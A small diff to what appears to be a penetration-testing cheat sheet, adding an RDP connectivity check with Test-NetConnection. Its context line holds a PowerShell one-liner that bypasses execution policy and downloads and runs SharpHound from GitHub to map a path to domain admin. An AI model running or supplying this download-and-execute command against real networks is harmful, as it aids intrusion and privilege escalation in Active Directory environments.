@@ -41,3 +41,6 @@
 
 * Invoke-Bloodhound and find shortest path for becoming domain admin
 -> powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
+
+* to test the connection between other machines which using powershell command change valid ip adres
+-> Test-NetConnection 10.10.10.10 -CommonTCPPort rdp
